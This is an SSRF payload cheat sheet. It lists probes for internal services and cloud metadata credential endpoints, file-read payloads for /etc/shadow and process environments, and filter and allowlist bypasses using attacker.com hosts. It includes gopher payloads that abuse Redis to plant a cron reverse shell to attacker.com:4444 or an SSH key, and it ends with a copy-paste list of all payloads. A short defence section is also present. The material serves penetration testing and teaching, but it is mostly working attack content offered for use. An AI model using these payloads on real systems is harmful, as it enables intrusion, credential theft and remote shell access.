# SSRF PAYLOADS COMPLETE CHEAT SHEET

## 1. WHAT IS SSRF?

**Server-Side Request Forgery (SSRF)** is a vulnerability that allows an attacker to manipulate an application into making HTTP (or other protocol) requests to a domain of their choice, using the backend server's network identity.

This is especially critical in cloud environments, where the server can reach the **metadata endpoint** (e.g., `169.254.169.254`) and obtain temporary IAM credentials, leading to full account compromise. SSRF entered the **OWASP Top 10 in 2021 (A10)** and remained in the 2025 revision.

---

## 2. TYPES OF SSRF

| Type | Description |
|------|-------------|
| **Classic (In-Band)** | The attacker sees the server's response in the request itself. |
| **Blind (Out-of-Band)** | The response is not visible directly; detected via DNS, response times, or external tools (Burp Collaborator, Interactsh). |

---

## 3. WHERE TO FIND SSRF (ATTACK SURFACE)

Any functionality that **fetches a URL** controllable by the user:

- **Webhooks** and user-configurable callbacks.
- **Image processors** that download avatars from external URLs.
- **PDF generators** that convert URLs to PDF.
- **Link previewers**.
- **Reverse proxy / API Gateway** that forwards requests.
- **OAuth integrations** with configurable redirect URIs.
- **XXE vulnerabilities** that can lead to SSRF.

---

## 4. EXPLOITABLE PROTOCOLS AND SCHEMES

SSRF is not limited to HTTP. The following schemes may be supported by the application:

| Scheme | Use / Example |
|--------|---------------|
| `http://` / `https://` | Standard HTTP requests. |
| `file://` | Local file read: `file:///etc/passwd`. |
| `dict://` | DICT protocol to access definitions/wordlists. |
| `gopher://` | Lightweight protocol that allows building arbitrary requests (very powerful). |
| `ftp://` / `sftp://` | File transfer. |
| `ldap://` | LDAP directory access. |
| `tftp://` | Trivial File Transfer Protocol. |
| `phar://` | PHP file deserialization. |
| `data://` | Inline data injection. |
| `netdoc://` | Java-specific file read. |
| `jar://` | Java archive access. |

---

## 5. DETECTION PAYLOADS

### 5.1 Basic URL Probes
Use these to test if the parameter is vulnerable to SSRF.

```
http://127.0.0.1
http://localhost
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379
http://127.0.0.1:9200
http://127.0.0.1:8080
http://127.0.0.1:8443
http://[::1]
http://0.0.0.0
http://0
http://127.1
http://127.0.1
```

### 5.2 Cloud Metadata Endpoints

| Cloud | Endpoint |
|-------|----------|
| **AWS** | `http://169.254.169.254/latest/meta-data/` |
| **AWS (IMDSv2)** | `http://169.254.169.254/latest/api/token` (requires header `X-aws-ec2-metadata-token`) |
| **GCP** | `http://metadata.google.internal/computeMetadata/v1/` |
| **Azure** | `http://169.254.169.254/metadata/instance?api-version=2017-08-01` |
| **DigitalOcean** | `http://169.254.169.254/metadata/v1.json` |
| **Alibaba Cloud** | `http://100.100.100.200/latest/meta-data/` |
| **Oracle Cloud** | `http://169.254.169.254/opc/v1/instance/` |

### 5.3 File Read Payloads
```
file:///etc/passwd
file:///etc/hosts
file:///etc/shadow
file:///proc/self/environ
file:///proc/self/cmdline
file:///c:/windows/win.ini
file:///c:/windows/system32/drivers/etc/hosts
```

### 5.4 Internal Port Scanning
```
http://127.0.0.1:22
http://127.0.0.1:25
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:3306
http://127.0.0.1:5432
http://127.0.0.1:6379
http://127.0.0.1:8080
http://127.0.0.1:9200
http://127.0.0.1:11211
http://127.0.0.1:27017
```

### 5.5 Internal Service Access
```
http://127.0.0.1:6379/  (Redis)
http://127.0.0.1:9200/  (Elasticsearch)
http://127.0.0.1:11211/ (Memcached)
http://127.0.0.1:27017/ (MongoDB)
http://127.0.0.1:8080/manager/html (Tomcat)
http://127.0.0.1:8161/admin/ (ActiveMQ)
http://127.0.0.1:15672/ (RabbitMQ Management)
```

### 5.6 Blind SSRF Detection
Use external listeners to detect DNS/HTTP callbacks.

```
http://<BURP-COLLABORATOR-SUBDOMAIN>
http://<INTERACTSH-SUBDOMAIN>
http://<YOUR-SERVER>/ssrf
http://<YOUR-SERVER>:8080/ssrf
```

---

## 6. BYPASS TECHNIQUES

### 6.1 IP Obfuscation

| Original | Obfuscated |
|----------|------------|
| `127.0.0.1` | `http://0x7f000001` (hex) |
| `127.0.0.1` | `http://0177.0.0.1` (octal) |
| `127.0.0.1` | `http://2130706433` (decimal) |
| `127.0.0.1` | `http://127.1` (abbreviated) |
| `127.0.0.1` | `http://[::1]` (IPv6) |
| `127.0.0.1` | `http://[0:0:0:0:0:ffff:127.0.0.1]` |
| `127.0.0.1` | `http://127.0.0.1.nip.io` |
| `127.0.0.1` | `http://localtest.me` |
| `127.0.0.1` | `http://spoofed.burpcollaborator.net` |

### 6.2 Allowlist Bypass

```
http://trusted-domain.com.attacker.com
http://attacker.com#trusted-domain.com
http://attacker.com?trusted-domain.com
http://attacker.com@trusted-domain.com
http://trusted-domain.com@attacker.com
http://trusted-domain.com.attacker.com/
http://attacker.com/trusted-domain.com
http://trusted-domain.com%00.attacker.com
http://trusted-domain.com%2f@attacker.com
http://trusted-domain.com%252f@attacker.com
```

### 6.3 URL Encoding

```
http://127.0.0.1%252f%252fexample.com
http://127.0.0.1%2f%2fexample.com
http://127.0.0.1%00.example.com
%68%74%74%70%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31
```

### 6.4 Case Variation in Scheme

```
hTtP://127.0.0.1
HtTp://127.0.0.1
HTTP://127.0.0.1
hTTp://127.0.0.1
```

### 6.5 Backslash and Special Characters

```
http://127.0.0.1\
http:\\\\127.0.0.1
http://127.0.0.1/..
http://127.0.0.1/././././././././././././././.
```

### 6.6 Open Redirect Bypass
If the application allows SSRF to a whitelisted domain and follows redirects, abuse an **open redirect** on that domain to redirect to an internal destination.

```
https://trusted-domain.com/redirect?url=http://169.254.169.254/latest/meta-data/
```

### 6.7 DNS Rebinding
A domain resolves to a public IP on the first query (validation) and to a private IP on the second query (actual fetch).

```
http://make-127-0-0-1-rebind.attacker.com
http://rebind.attacker.com
```

### 6.8 Redirect-Based Bypass
The URL is validated against private IPs, but the HTTP client follows redirects without re-validating the destination.

```
http://trusted-domain.com/redirect-to?url=http://127.0.0.1
http://trusted-domain.com/r?u=http://169.254.169.254
```

### 6.9 DNS Resolution Bypass

```
http://127.0.0.1.nip.io
http://127.0.0.1.sslip.io
http://localtest.me
http://lvh.me
http://spoofed.burpcollaborator.net
http://<BURP-COLLABORATOR-SUBDOMAIN>
```

---

## 7. GOPHER PAYLOADS (REDIS EXAMPLE)

Gopher allows building arbitrary TCP requests, ideal for attacking Redis, Memcached, etc.

**Redis - Flushall:**
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
```

**Redis - Set Key:**
```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$4%0d%0atest%0d%0a
```

**Redis - Write Crontab (RCE):**
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

**Redis - Write SSH Key:**
```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$100%0d%0a%0a%0assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

---

## 8. BLIND SSRF TECHNIQUES

- Use **Burp Collaborator** or **Interactsh** to detect outbound DNS/HTTP requests.
- Measure response times to infer if a port is open (time-based).
- Use different protocols to see if responses differ.
- Use `--resolve` with curl to test DNS rebinding.
- Use `%0d%0a` (CRLF) to inject headers into the outbound request.

---

## 9. TOOLS

| Tool | Usage |
|------|-------|
| **Burp Suite** | Manual detection and exploitation. |
| **Interactsh** | Blind SSRF via DNS/HTTP. |
| **SSRFKiller** | Framework with 300+ bypass payloads. |
| **PayloadsAllTheThings** | Payload repository. |
| **HackTricks** | Complete SSRF guide. |
| **Gopherus** | Generates gopher payloads for Redis, MySQL, FastCGI, etc. |
| **SSRFmap** | Automatic SSRF exploitation. |
| **Collaborator Everywhere** | Burp extension for blind SSRF. |

---

## 10. DEFENSE / PREVENTION

### 10.1 Input Validation (Application Layer)
- **Normalize the URL** before validating: convert Unicode, replace backslashes, remove embedded credentials.
- **Allowlist of schemes**: only allow `http` and `https`.
- **Allowlist of domains/IPs** where possible.
- **Do not use regex** to validate URLs; use robust parsers (e.g., WHATWG URL API in Node).
- **Resolve the hostname to an IP** and verify it is not private, loopback, link-local, or reserved.

### 10.2 Network Controls (Network Layer)
- **Network segmentation**: isolate the backend from internal networks and metadata.
- **Firewall / Security Groups**: block outbound traffic to private ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16).
- **eBPF filters** to filter suspicious requests at kernel level.

### 10.3 HTTP Client Configuration
- **Disable automatic redirects** and re-validate each hop.
- **Set timeouts** and response size limits.
- **Do not send credentials** or cookies in fetched requests.

### 10.4 Cloud-Native Defenses
- **AWS**: use IMDSv2 (requires token) instead of IMDSv1.
- **IAM policies**: limit instance role permissions to the minimum necessary.
- **Use AWS Metadata Service No Proxy** or **metadata firewall**.

### 10.5 OWASP Additional Recommendations
- If the application only needs to communicate with a fixed set of applications, use a **destination allowlist**.
- Prevent **XXE** which can lead to SSRF.

---

## 11. TIPS FOR TESTING

1. Identify any parameter that accepts a URL or hostname.
2. Start with `http://127.0.0.1` and `http://localhost`.
3. Use Burp Collaborator or Interactsh to detect blind SSRF.
4. Try different protocols: `file://`, `gopher://`, `dict://`.
5. If filtered, try IP obfuscation (hex, octal, decimal).
6. Try allowlist bypass with `@`, `#`, subdomains, and URL encoding.
7. Test for open redirects on whitelisted domains.
8. Test DNS rebinding with services like `nip.io` or `sslip.io`.
9. For cloud environments, always test metadata endpoints.
10. Use `gopher://` to attack internal services like Redis, MySQL, FastCGI.

---

## ALL IN ONE JUST FOR COPY PASTE AND USE IN A TXT FILE

```
http://127.0.0.1
http://localhost
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.0.0.1:25
http://127.0.0.1:3306
http://127.0.0.1:5432
http://127.0.0.1:6379
http://127.0.0.1:8080
http://127.0.0.1:8443
http://127.0.0.1:9200
http://127.0.0.1:11211
http://127.0.0.1:27017
http://127.0.0.1:15672
http://127.0.0.1:8161
http://[::1]
http://0.0.0.0
http://0
http://127.1
http://127.0.1
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/api/token
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/metadata/instance?api-version=2017-08-01
http://169.254.169.254/metadata/v1.json
http://100.100.100.200/latest/meta-data/
http://169.254.169.254/opc/v1/instance/
file:///etc/passwd
file:///etc/hosts
file:///etc/shadow
file:///proc/self/environ
file:///proc/self/cmdline
file:///c:/windows/win.ini
file:///c:/windows/system32/drivers/etc/hosts
http://0x7f000001
http://0177.0.0.1
http://2130706433
http://127.1
http://[::1]
http://[0:0:0:0:0:ffff:127.0.0.1]
http://127.0.0.1.nip.io
http://127.0.0.1.sslip.io
http://localtest.me
http://lvh.me
http://spoofed.burpcollaborator.net
http://trusted-domain.com.attacker.com
http://attacker.com#trusted-domain.com
http://attacker.com?trusted-domain.com
http://attacker.com@trusted-domain.com
http://trusted-domain.com@attacker.com
http://trusted-domain.com.attacker.com/
http://attacker.com/trusted-domain.com
http://trusted-domain.com%00.attacker.com
http://trusted-domain.com%2f@attacker.com
http://trusted-domain.com%252f@attacker.com
http://127.0.0.1%252f%252fexample.com
http://127.0.0.1%2f%2fexample.com
http://127.0.0.1%00.example.com
%68%74%74%70%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31
hTtP://127.0.0.1
HtTp://127.0.0.1
HTTP://127.0.0.1
hTTp://127.0.0.1
http://127.0.0.1\
http:\\\\127.0.0.1
http://127.0.0.1/..
http://127.0.0.1/././././././././././././././.
https://trusted-domain.com/redirect?url=http://169.254.169.254/latest/meta-data/
http://make-127-0-0-1-rebind.attacker.com
http://rebind.attacker.com
http://trusted-domain.com/redirect-to?url=http://127.0.0.1
http://trusted-domain.com/r?u=http://169.254.169.254
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$4%0d%0atest%0d%0a
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$100%0d%0a%0a%0assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
dict://127.0.0.1:11211/stat
dict://127.0.0.1:6379/info
ftp://127.0.0.1
sftp://127.0.0.1
ldap://127.0.0.1
tftp://127.0.0.1
```
